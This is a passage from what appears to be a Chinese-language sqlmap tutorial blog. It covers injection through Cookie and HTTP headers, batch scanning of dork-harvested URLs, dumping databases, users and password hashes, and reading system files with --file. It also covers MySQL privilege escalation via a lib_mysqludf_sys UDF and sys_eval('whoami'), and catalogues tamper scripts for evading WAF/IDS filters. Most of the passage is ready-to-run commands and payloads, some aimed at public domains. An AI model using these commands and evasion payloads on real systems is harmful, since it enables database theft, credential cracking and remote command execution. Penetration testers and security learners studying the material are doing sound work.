+<h3 id="HTTP头部注入自动检测"><a href="#HTTP头部注入自动检测" class="headerlink" title="HTTP头部注入自动检测"></a>HTTP头部注入自动检测</h3><p>使用参数-u后接网站的url用于明确使用sqlmap进行sql注入的网址。使用参数—cookie，指定cookie内容是”uname=abc”。 </p>
+<p>参数—level共有五个等级，默认为1，sqlmap使用的payload可以在xml/payloads.xml中看到，你也可以根据相应的格式添加自己的payload。这个参数不仅影响使用哪些payload同时也会影响测试的注入点，GET和POST的数据都会测试，<strong>HTTP Cookie在level为2的时候就会测试，HTTP User-Agent/Referer头在level为3的时候就会测试。</strong></p>
+<h4 id="Cookie头部注入"><a href="#Cookie头部注入" class="headerlink" title="Cookie头部注入"></a>Cookie头部注入</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://hackrock.com:811/Less-20/index.php&quot; --cookie &quot;uname=abc&quot; --dbs --level 2</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2021/11/03/AUJmi1QP73TnOVy.png" alt="image-20211103130542625"></p>
+<h4 id="其他头部注入"><a href="#其他头部注入" class="headerlink" title="其他头部注入"></a>其他头部注入</h4><p>将BurpSuit抓包到的request请求内容复制到一个文本文件。在可能存在注入的http头部加上（*）星号。</p>
+<p><img src="https://i.loli.net/2021/11/03/BtedTRKru1pXm4E.png" alt="image-20211103165518726"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -r less18.txt --dbs</span><br></pre></td></tr></table></figure>
+<h3 id="批量自动化检测"><a href="#批量自动化检测" class="headerlink" title="批量自动化检测"></a>批量自动化检测</h3><p>可以使用谷歌语法将可能存在注入URL写入到文本文件中，使用sqlmap进行批量检测。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -m test.txt --batch --random-agent</span><br></pre></td></tr></table></figure>
+<p>使用Google语法进行URL采集工具可以参考我写的一个脚本：<a href="https://github.com/UlyssesTakusen/CaiJiEngine">https://github.com/UlyssesTakusen/CaiJiEngine</a></p>
+<h3 id="数据库的相关操作"><a href="#数据库的相关操作" class="headerlink" title="数据库的相关操作"></a>数据库的相关操作</h3><ul>
+<li><p>列数据库信息： —dbs</p>
+</li>
+<li><p>web当前使用的数据库： —current-db</p>
+</li>
+<li><p>web数据库使用账户： —current-user</p>
+</li>
+<li><p>列出sqlserver所有用户： —users</p>
+</li>
+<li><p>数据库账户与密码： —passwords</p>
+</li>
+<li><p>指定库名列出所有表：  -D database —tables</p>
+<p>-D：指定数据库名称</p>
+</li>
+<li><p>指定库名表名列出所有字段： <code>-D db_test -T tb_test --columns</code></p>
+<p>-T：指定要列出字段的表</p>
+</li>
+<li><p>指定库名表名字段dump出指定字段：</p>
+<p><code>-D db_test -T tb_test --columns -C  id,password,username --dump</code></p>
+<p><code>-D db_test -T tb_test --columns -C &quot;id,password,username&quot; --dump</code></p>
+<p>可加双引号，也可不加双引号。</p>
+</li>
+<li><p>导出多少条数据：</p>
+<p><code>-D db_test -T tb_test --columns -C &quot;id,password,username&quot; --start 1 --stop 10 --dump</code></p>
+<p>参数：</p>
+<ul>
+<li>—start： 指定开始的行</li>
+<li>—stop： 指定结束的行</li>
+</ul>
+<p>此条命令的含义为： 导出数据库db_test中的表tb_test中的字段(id,password,username)中的第1到第10行的数据内容。</p>
+</li>
+</ul>
+<h3 id="直接连接数据库"><a href="#直接连接数据库" class="headerlink" title="直接连接数据库"></a>直接连接数据库</h3><p>sqlmap直接连接数据库的命令如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -d &quot;mysql://root:Admin123@192.168.21.17:3306/testdb&quot; -f --banner --dbs --users</span><br></pre></td></tr></table></figure>
+<p>注：root为数据库账户；Admin123为数据库密码</p>
+<h3 id="其它操作"><a href="#其它操作" class="headerlink" title="其它操作"></a>其它操作</h3><h4 id="列举并破解密码哈希值"><a href="#列举并破解密码哈希值" class="headerlink" title="列举并破解密码哈希值"></a>列举并破解密码哈希值</h4><p>  当前用户有权限读取包含用户密码的权限时，sqlmap会现列举出用户，然后列出hash，并尝试破解。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u&quot;http://192.168.136.131/sqlmap/pgsql/get_int.php?id=1&quot; --passwords -v 1</span><br></pre></td></tr></table></figure>
+<h4 id="获取表中的数据个数"><a href="#获取表中的数据个数" class="headerlink" title="获取表中的数据个数"></a>获取表中的数据个数</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.21.129/sqlmap/mssql/iis/get_int.asp?id=1&quot; --count -D testdb</span><br></pre></td></tr></table></figure>
+<h4 id="对网站进行漏洞爬取"><a href="#对网站进行漏洞爬取" class="headerlink" title="对网站进行漏洞爬取"></a>对网站进行漏洞爬取</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://www.secbang.com&quot; --batch --crawl=3</span><br></pre></td></tr></table></figure>
+<h4 id="使用hex避免字符编码导致数据丢失"><a href="#使用hex避免字符编码导致数据丢失" class="headerlink" title="使用hex避免字符编码导致数据丢失"></a>使用hex避免字符编码导致数据丢失</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.48.130/pgsql/get_int.php?id=1&quot; --banner --hex -v 3 --parse-errors</span><br></pre></td></tr></table></figure>
+<h4 id="时间型盲注自定义延时"><a href="#时间型盲注自定义延时" class="headerlink" title="时间型盲注自定义延时"></a>时间型盲注自定义延时</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://www.target.com/vuln.php?id=1&quot; --technique T --time-sec=3</span><br></pre></td></tr></table></figure>
+<h4 id="模拟测试手机环境站点"><a href="#模拟测试手机环境站点" class="headerlink" title="模拟测试手机环境站点"></a>模拟测试手机环境站点</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://www.target.com/vuln.php?id=1&quot; --mobile</span><br></pre></td></tr></table></figure>
+<h4 id="智能判断测试"><a href="#智能判断测试" class="headerlink" title="智能判断测试"></a>智能判断测试</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://www.antian365.com/info.php?id=1&quot;--batch --smart</span><br></pre></td></tr></table></figure>
+<h4 id="读取系统文件"><a href="#读取系统文件" class="headerlink" title="读取系统文件"></a>读取系统文件</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap.py -u &quot;http://www.target.com/vuln.php?id=1&quot; --file /etc/password</span><br></pre></td></tr></table></figure>
+<h4 id="MySQL提权"><a href="#MySQL提权" class="headerlink" title="MySQL提权"></a>MySQL提权</h4><ol>
+<li><p>首先需要对动态链接库进行解码</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /usr/share/sqlmap/extra/cloak/</span><br><span class="line"></span><br><span class="line">python cloak.py -d -i /usr/share/sqlmap/data/udf/mysql/windows/32/lib_mysqludf_sys.dll_ -o /root/temp/lib_mysqludf_sys.dll</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<ol>
+<li><p>连接MySQL数据库打开一个交互式Shell：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>d mysql:<span class="operator">/</span><span class="operator">/</span>root:Admin12345<span class="variable">@192</span><span class="number">.168</span><span class="number">.123</span><span class="number">.188</span>:<span class="number">3306</span><span class="operator">/</span>dvwa <span class="comment">--sql-shell</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> @<span class="variable">@version</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> @<span class="variable">@plugin</span>_dir</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2021/11/03/jySD4HUKl2ZLJ3B.png" alt="image-20211103204311361"></p>
+</li>
+</ol>
+<ol>
+<li><p>利用sqlmap上传lib_mysqludf_sys到MySQL插件目录</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -d mysql://root:Admin12345@192.168.123.188:3306/dvwa --file-write=/root/temp/lib_mysqludf_sys.dll --file-dest=C:\\Wamp\\mysql5.5\\lib\\plugin\\lib_mysqludf_sys.dll </span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<ol>
+<li><p>执行语句创建用户自定义函数</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>d mysql:<span class="operator">/</span><span class="operator">/</span>root:Admin12345<span class="variable">@192</span><span class="number">.168</span><span class="number">.123</span><span class="number">.188</span>:<span class="number">3306</span><span class="operator">/</span>dvwa <span class="comment">--sql-shell</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">FUNCTION</span> sys_eval <span class="keyword">RETURNS</span> STRING SONAME <span class="string">&#x27;lib_mysqludf_sys.dll&#x27;</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> sys_eval(<span class="string">&#x27;whoami&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2021/11/03/vA85OH97UZC6rgM.png" alt="image-20211103214845485"></p>
+</li>
+</ol>
+<h2 id="tamper脚本"><a href="#tamper脚本" class="headerlink" title="tamper脚本"></a>tamper脚本</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>tamper是对sqlmap进行扩展的一系列脚本，主要功能是对本来的<code>payload</code>进行特定的更改以绕过<code>waf/ids</code>。</p>
+<p>可以理解为，sqlmap在对漏洞网站自动化注入的时候，如果我们使用了tamper脚本，sqlmap的每个payload都会经过tamper这个包装车间的加工，然后再进行投递。</p>
+<h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><p>命令格式：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u [url] --tamper [模块名]</span><br></pre></td></tr></table></figure>
+<p>根据实际情况，可以同时使用多个脚本，使用-v参数可以看到payload的变化。</p>
+<p>举例：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://hackrock.com:811/Less-2/?id=1&quot; --dbms mysql --tamper &quot;space2comment,versionedmorekeywords.py&quot;  -v 3 --dbs</span><br></pre></td></tr></table></figure>
+<p>在Kali Linux系统中，sqlmap的tamper脚本在<code>cd /usr/share/sqlmap/tamper</code>下</p>
+<p><img src="https://i.loli.net/2021/11/04/WRmuVL7eEv3Hhyq.png" alt="image-20211104103012440"></p>
+<h3 id="常用tamper脚本说明"><a href="#常用tamper脚本说明" class="headerlink" title="常用tamper脚本说明"></a>常用tamper脚本说明</h3><h4 id="apostrophemask-py"><a href="#apostrophemask-py" class="headerlink" title="apostrophemask.py"></a>apostrophemask.py</h4><ul>
+<li>适用数据库：ALL</li>
+<li>作用：将引号替换为utf-8，用于过滤单引号</li>
+<li>使用脚本前：<code>tamper(&quot;1 AND &#39;1&#39;=&#39;1&quot;)</code></li>
+<li>使用脚本后：<code>1 AND %EF%BC%871%EF%BC%87=%EF%BC%871</code></li>
+</ul>
+<h4 id="base64encode-py"><a href="#base64encode-py" class="headerlink" title="base64encode.py"></a>base64encode.py</h4><ul>
+<li>适用数据库：ALL</li>
+<li>作用：替换为base64编码</li>
+<li>使用脚本前：<code>tamper(&quot;1&#39; AND SLEEP(5)#&quot;)</code></li>
+<li>使用脚本后：<code>MScgQU5EIFNMRUVQKDUpIw==</code></li>
+</ul>
+<h4 id="multiplespaces-py"><a href="#multiplespaces-py" class="headerlink" title="multiplespaces.py"></a>multiplespaces.py</h4><ul>
+<li>适用数据库：ALL</li>
+<li>作用：围绕sql关键字添加多个空格</li>
+<li>使用脚本前：<code>tamper(&#39;1 UNION SELECT foobar&#39;)</code></li>
+<li>使用脚本后：<code>1 UNION SELECT foobar</code></li>
+</ul>
+<h4 id="space2plus-py"><a href="#space2plus-py" class="headerlink" title="space2plus.py"></a>space2plus.py</h4><ul>
+<li>适用数据库：ALL</li>
+<li>作用：用加号替换空格</li>
+<li>使用脚本前：<code>tamper(&#39;SELECT id FROM users&#39;)</code></li>
+<li>使用脚本后：<code>SELECT+id+FROM+users</code></li>
+</ul>
+<h4 id="nonrecursivereplacement-py"><a href="#nonrecursivereplacement-py" class="headerlink" title="nonrecursivereplacement.py"></a>nonrecursivereplacement.py</h4><ul>
+<li>适用数据库：ALL</li>
+<li>作用：作为双重查询语句，用双重语句替代预定义的sql关键字（适用于非常弱的自定义过滤器，例如将select替换为空）</li>
+<li>使用脚本前：<code>tamper(&#39;1 UNION SELECT 2--&#39;)</code></li>
+<li>使用脚本后：<code>1 UNIOUNIONN SELESELECTCT 2--</code></li>
+</ul>
+<h4 id="space2randomblank-py"><a href="#space2randomblank-py" class="headerlink" title="space2randomblank.py"></a>space2randomblank.py</h4><ul>
+<li>适用数据库：ALL</li>
+<li>作用：将空格替换为其他有效字符</li>
+<li>使用脚本前：<code>tamper(&#39;SELECT id FROM users&#39;)</code></li>
+<li>使用脚本后：<code>SELECT%0Did%0DFROM%0Ausers</code></li>
+</ul>
+<h4 id="unionalltounion-py"><a href="#unionalltounion-py" class="headerlink" title="unionalltounion.py"></a>unionalltounion.py</h4><ul>
+<li>适用数据库：ALL</li>
+<li>作用：将union all select 替换为union select</li>
+<li>使用脚本前：<code>tamper(&#39;-1 UNION ALL SELECT&#39;)</code></li>
+<li>使用脚本后：<code>-1 UNION SELECT</code></li>
+</ul>
+<h4 id="securesphere-py"><a href="#securesphere-py" class="headerlink" title="securesphere.py"></a>securesphere.py</h4><ul>
+<li>适用数据库：ALL</li>
+<li>作用：追加特定的字符串</li>
+<li>使用脚本前：<code>tamper(&#39;1 AND 1=1&#39;)</code></li>
+<li>使用脚本后：<code>1 AND 1=1 and &#39;0having&#39;=&#39;0having&#39;</code></li>
+</ul>
+<h4 id="space2dash-py"><a href="#space2dash-py" class="headerlink" title="space2dash.py"></a>space2dash.py</h4><ul>
+<li>适用数据库：ALL</li>
+<li>作用：将空格替换为—，并添加一个随机字符串和换行符</li>
+<li>使用脚本前：<code>tamper(&#39;1 AND 9227=9227&#39;)</code></li>
+<li>使用脚本后：<code>1--nVNaVoPYeva%0AAND--ngNvzqu%0A9227=9227</code></li>
+</ul>
+<h4 id="space2mssqlblank-py"><a href="#space2mssqlblank-py" class="headerlink" title="space2mssqlblank.py"></a>space2mssqlblank.py</h4><ul>
+<li>适用数据库：Microsoft SQL Server<br>测试通过数据库：Microsoft SQL Server 2000、Microsoft SQL Server 2005</li>
+<li>作用：将空格随机替换为其他空格符号(‘%01’, ‘%02’, ‘%03’, ‘%04’, ‘%05’, ‘%06’, ‘%07’, ‘%08’, ‘%09’, ‘%0B’, ‘%0C’, ‘%0D’, ‘%0E’, ‘%0F’, ‘%0A’)</li>
+<li>使用脚本前：<code>tamper(&#39;SELECT id FROM users&#39;)</code></li>
+<li>使用脚本后：<code>SELECT%0Eid%0DFROM%07users</code></li>
+</ul>
+<h4 id="between-py"><a href="#between-py" class="headerlink" title="between.py"></a>between.py</h4><p>测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0</p>
+<ul>
+<li>作用：用NOT BETWEEN 0 AND #替换&gt;</li>
+<li>使用脚本前：<code>tamper(&#39;1 AND A &gt; B--&#39;)</code></li>
+<li>使用脚本后：<code>1 AND A NOT BETWEEN 0 AND B--</code></li>
+</ul>
+<h4 id="percentage-py"><a href="#percentage-py" class="headerlink" title="percentage.py"></a>percentage.py</h4><ul>
+<li>适用数据库：ASP<br>测试通过数据库：Microsoft SQL Server 2000, 2005、MySQL 5.1.56, 5.5.11、PostgreSQL 9.0</li>
+<li>作用：在每个字符前添加一个%</li>
+<li>使用脚本前：<code>tamper(&#39;SELECT FIELD FROM TABLE&#39;)</code></li>
+<li>使用脚本后：<code>%S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E</code></li>
+</ul>
+<h4 id="sp-password-py"><a href="#sp-password-py" class="headerlink" title="sp_password.py"></a>sp_password.py</h4><ul>
+<li>适用数据库：MSSQL</li>
+<li>作用：从T-SQL日志的自动迷糊处理的有效载荷中追加sp_password</li>
+<li>使用脚本前：<code>tamper(&#39;1 AND 9227=9227-- &#39;)</code></li>
+<li>使用脚本后：<code>1 AND 9227=9227-- sp_password</code></li>
+</ul>
+<h4 id="charencode-py"><a href="#charencode-py" class="headerlink" title="charencode.py"></a>charencode.py</h4><p>测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0</p>
+<ul>
+<li>作用：对给定的payload全部字符使用url编码（不处理已经编码的字符）</li>
+<li>使用脚本前：<code>tamper(&#39;SELECT FIELD FROM%20TABLE&#39;)</code></li>
+<li>使用脚本后：<code>%53%45%4C%45%43%54%20%46%49%45%4C%44%20%46%52%4F%4D%20%54%41%42%4C%45</code></li>
+</ul>
+<h4 id="randomcase-py"><a href="#randomcase-py" class="headerlink" title="randomcase.py"></a>randomcase.py</h4><p>测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0</p>
+<ul>
+<li>作用：随机大小写</li>
+<li>使用脚本前：<code>tamper(&#39;INSERT&#39;)</code></li>
+<li>使用脚本后：<code>INseRt</code></li>
+</ul>
+<h4 id="charunicodeencode-py"><a href="#charunicodeencode-py" class="headerlink" title="charunicodeencode.py"></a>charunicodeencode.py</h4><ul>
+<li>适用数据库：ASP、ASP.NET<br>测试通过数据库：Microsoft SQL Server 2000/2005、MySQL 5.1.56、PostgreSQL 9.0.3</li>
+<li>作用：适用字符串的unicode编码</li>
+<li>使用脚本前：<code>tamper(&#39;SELECT FIELD%20FROM TABLE&#39;)</code></li>
+<li>使用脚本后：<code>%u0053%u0045%u004C%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004C%u0044%u0020%u0046%u0052%u004F%u004D%u0020%u0054%u0041%u0042%u004C%u0045</code></li>
+</ul>
+<h4 id="space2comment-py"><a href="#space2comment-py" class="headerlink" title="space2comment.py"></a>space2comment.py</h4><p>测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0</p>
+<ul>
+<li>作用：将空格替换为/**/</li>
+<li>使用脚本前：<code>tamper(&#39;SELECT id FROM users&#39;)</code></li>
+<li>使用脚本后：<code>SELECT/**/id/**/FROM/**/users</code></li>
+</ul>
+<h4 id="equaltolike-py"><a href="#equaltolike-py" class="headerlink" title="equaltolike.py"></a>equaltolike.py</h4><p>测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5</p>
+<ul>
+<li>作用：将=替换为LIKE</li>
+<li>使用脚本前：<code>tamper(&#39;SELECT * FROM users WHERE id=1&#39;)</code></li>
+<li>使用脚本后：<code>SELECT * FROM users WHERE id LIKE 1</code></li>
+</ul>
+<h4 id="equaltolike-py-1"><a href="#equaltolike-py-1" class="headerlink" title="equaltolike.py"></a>equaltolike.py</h4><p>测试通过数据库：MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0</p>
+<ul>
+<li>作用：将&gt;替换为GREATEST，绕过对&gt;的过滤</li>
+<li>使用脚本前：<code>tamper(&#39;1 AND A &gt; B&#39;)</code></li>
+<li>使用脚本后：<code>1 AND GREATEST(A,B+1)=A</code></li>
+</ul>
+<h4 id="ifnull2ifisnull-py"><a href="#ifnull2ifisnull-py" class="headerlink" title="ifnull2ifisnull.py"></a>ifnull2ifisnull.py</h4><ul>
+<li>适用数据库：MySQL、SQLite (possibly)、SAP MaxDB (possibly)<br>测试通过数据库：MySQL 5.0 and 5.5</li>
+<li>作用：将类似于IFNULL(A, B)替换为IF(ISNULL(A), B, A)，绕过对IFNULL的过滤</li>
+<li>使用脚本前：<code>tamper(&#39;IFNULL(1, 2)&#39;)</code></li>
+<li>使用脚本后：<code>IF(ISNULL(1),2,1)</code></li>
+</ul>
+<h4 id="modsecurityversioned-py"><a href="#modsecurityversioned-py" class="headerlink" title="modsecurityversioned.py"></a>modsecurityversioned.py</h4><ul>
+<li>适用数据库：MySQL<br>测试通过数据库：MySQL 5.0</li>
+<li>作用：过滤空格，使用mysql内联注释的方式进行注入</li>
+<li>使用脚本前：<code>tamper(&#39;1 AND 2&gt;1--&#39;)</code></li>
+<li>使用脚本后：<code>1 /*!30874AND 2&gt;1*/--</code></li>
+</ul>
+<h4 id="space2mysqlblank-py"><a href="#space2mysqlblank-py" class="headerlink" title="space2mysqlblank.py"></a>space2mysqlblank.py</h4><ul>
+<li>适用数据库：MySQL<br>测试通过数据库：MySQL 5.1</li>
+<li>作用：将空格替换为其他空格符号(‘%09’, ‘%0A’, ‘%0C’, ‘%0D’, ‘%0B’)</li>
+<li>使用脚本前：<code>tamper(&#39;SELECT id FROM users&#39;)</code></li>
+<li>使用脚本后：<code>SELECT%0Bid%0DFROM%0Cusers</code></li>
+</ul>
+<h4 id="modsecurityzeroversioned-py"><a href="#modsecurityzeroversioned-py" class="headerlink" title="modsecurityzeroversioned.py"></a>modsecurityzeroversioned.py</h4><ul>
+<li>适用数据库：MySQL<br>测试通过数据库：MySQL 5.0</li>
+<li>作用：使用内联注释方式（/<em>!00000</em>/）进行注入</li>
+<li>使用脚本前：<code>tamper(&#39;1 AND 2&gt;1--&#39;)</code></li>
+<li>使用脚本后：<code>1 /*!00000AND 2&gt;1*/--</code></li>
+</ul>
+<h4 id="space2mysqldash-py"><a href="#space2mysqldash-py" class="headerlink" title="space2mysqldash.py"></a>space2mysqldash.py</h4><ul>
+<li>适用数据库：MySQL、MSSQL</li>
+<li>作用：将空格替换为 — ，并追随一个换行符</li>
+<li>使用脚本前：<code>tamper(&#39;1 AND 9227=9227&#39;)</code></li>
+<li>使用脚本后：<code>1--%0AAND--%0A9227=9227</code></li>
+</ul>
+<h4 id="bluecoat-py"><a href="#bluecoat-py" class="headerlink" title="bluecoat.py"></a>bluecoat.py</h4><ul>
+<li>适用数据库：Blue Coat SGOS<br>测试通过数据库：MySQL 5.1,、SGOS</li>
+<li>作用：在sql语句之后用有效的随机空白字符替换空格符，随后用LIKE替换=</li>
+<li>使用脚本前：<code>tamper(&#39;SELECT id FROM users where id = 1&#39;)</code></li>
+<li>使用脚本后：<code>SELECT%09id FROM users where id LIKE 1</code></li>
+</ul>
+<h4 id="versionedkeywords-py"><a href="#versionedkeywords-py" class="headerlink" title="versionedkeywords.py"></a>versionedkeywords.py</h4><ul>
+<li>适用数据库：MySQL<br>测试通过数据库：MySQL 4.0.18, 5.1.56, 5.5.11</li>
+<li>作用：注释绕过</li>
+<li>使用脚本前：<code>tamper(&#39;1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,100,114,117,58))#&#39;)</code></li>
+<li>使用脚本后：<code>1/*!UNION*//*!ALL*//*!SELECT*//*!NULL*/,/*!NULL*/, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER()/*!AS*//*!CHAR*/),CHAR(32)),CHAR(58,100,114,117,58))#</code></li>
+</ul>
+<h4 id="halfversionedmorekeywords-py"><a href="#halfversionedmorekeywords-py" class="headerlink" title="halfversionedmorekeywords.py"></a>halfversionedmorekeywords.py</h4><ul>
+<li>适用数据库：MySQL &lt; 5.1<br>测试通过数据库：MySQL 4.0.18/5.0.22</li>
+<li>作用：在每个关键字前添加mysql版本注释</li>
+<li>使用脚本前：`tamper(“value’ UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND ‘QDWa’=’QDWa”)</li>
+<li>使用脚本后：<code>value&#39;/*!0UNION/*!0ALL/*!0SELECT/*!0CONCAT(/*!0CHAR(58,107,112,113,58),/*!0IFNULL(CAST(/*!0CURRENT_USER()/*!0AS/*!0CHAR),/*!0CHAR(</code>32)),/<em>!0CHAR(`58,97,110,121,58)),/</em>!0NULL,/<em>!0NULL#/</em>!0AND ‘QDWa’=’QDWa</li>
+</ul>
+<h4 id="space2morehash-py"><a href="#space2morehash-py" class="headerlink" title="space2morehash.py"></a>space2morehash.py</h4><ul>
+<li>适用数据库：MySQL &gt;= 5.1.13<br>测试通过数据库：MySQL 5.1.41</li>
+<li>作用：将空格替换为#，并添加一个随机字符串和换行符</li>
+<li>使用脚本前：<code>tamper(&#39;1 AND 9227=9227&#39;)</code></li>
+<li>使用脚本后：<code>1%23ngNvzqu%0AAND%23nVNaVoPYeva%0A%23lujYFWfv%0A9227=9227</code></li>
+</ul>
+<h4 id="apostrophenullencode-py"><a href="#apostrophenullencode-py" class="headerlink" title="apostrophenullencode.py"></a>apostrophenullencode.py</h4><ul>
+<li>适用数据库：ALL</li>
+<li>作用：用非法双字节Unicode字符替换单引号</li>
+<li>使用脚本前：<code>tamper(&quot;1 AND &#39;1&#39;=&#39;1&quot;)</code></li>
+<li>使用脚本后：<code>1 AND %00%271%00%27=%00%271</code></li>
+</ul>
+<h4 id="appendnullbyte-py"><a href="#appendnullbyte-py" class="headerlink" title="appendnullbyte.py"></a>appendnullbyte.py</h4><ul>
+<li>适用数据库：ALL</li>
+<li>作用：在有效载荷的结束位置加载null字节字符编码</li>
+<li>使用脚本前：<code>tamper(&#39;1 AND 1=1&#39;)</code></li>
+<li>使用脚本后：<code>1 AND 1=1%00</code></li>
+</ul>
+<h4 id="chardoubleencode-py"><a href="#chardoubleencode-py" class="headerlink" title="chardoubleencode.py"></a>chardoubleencode.py</h4><ul>
+<li>适用数据库：ALL</li>
+<li>作用：对给定的payload全部字符使用双重url编码（不处理已经编码的字符）</li>
+<li>使用脚本前：<code>tamper(&#39;SELECT FIELD FROM%20TABLE&#39;)</code></li>
+<li>使用脚本后：<code>%2553%2545%254C%2545%2543%2554%2520%2546%2549%2545%254C%2544%2520%2546%2552%254F%254D%2520%2554%2541%2542%254C%2545</code></li>
+</ul>
+<h4 id="unmagicquotes-py"><a href="#unmagicquotes-py" class="headerlink" title="unmagicquotes.py"></a>unmagicquotes.py</h4><ul>
+<li>适用数据库：ALL</li>
+<li>作用：用一个多字节组合%bf%27和末尾通用注释一起替换空格</li>
+<li>使用脚本前：<code>tamper(&quot;1&#39; AND 1=1&quot;)</code></li>
+<li>使用脚本后：<code>1%bf%27 AND 1=1--</code></li>
+</ul>
+<h4 id="randomcomments-py"><a href="#randomcomments-py" class="headerlink" title="randomcomments.py"></a>randomcomments.py</h4><ul>
+<li>适用数据库：ALL</li>
+<li>作用：用注释符分割sql关键字</li>
+<li>使用脚本前：<code>tamper(&#39;INSERT&#39;)</code></li>
+<li>使用脚本后：<code>I/**/N/**/SERT</code></li>
+</ul>
+<h3 id="tamper脚本的编写"><a href="#tamper脚本的编写" class="headerlink" title="tamper脚本的编写"></a>tamper脚本的编写</h3><h4 id="tamper的结构"><a href="#tamper的结构" class="headerlink" title="tamper的结构"></a>tamper的结构</h4><p>以<code>escapequotes.py</code>这个tamper文件为例</p>
+<p>见名知义，该tamper是用来转义的，将单引号转换成<code>\\&#39;</code>，双引号转换成 <code>\\&quot;</code></p>
+<p>代码如下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Copyright (c) 2006-2020 sqlmap developers (http://sqlmap.org/)</span></span><br><span class="line"><span class="string">See the file &#x27;LICENSE&#x27; for copying permission</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.NORMAL</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dependencies</span>():</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span>(<span class="params">payload, **kwargs</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Slash escape single and double quotes (e.g. &#x27; -&gt; \&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; tamper(&#x27;1&quot; AND SLEEP(5)#&#x27;)</span></span><br><span class="line"><span class="string">    &#x27;1\\\\&quot; AND SLEEP(5)#&#x27;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> payload.replace(<span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;\\&#x27;&quot;</span>).replace(<span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;\\&quot;&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<p>不难看出，一个最小的tamper脚本结构为<code>__priority__变量</code>、<code>dependencies函数</code>和<code>tamper函数</code>。</p>
+<h5 id="priority-变量"><a href="#priority-变量" class="headerlink" title="_priority_变量"></a>_<em>priority_</em>变量</h5><p><code>__priority__</code>是当前脚本调用优先等级，该优先级用于使用多个tamper时的执行顺序选择</p>
+<p>在自带的tamper脚本中一共有以下几种优先级，还可以自定义<code>-100~100</code></p>
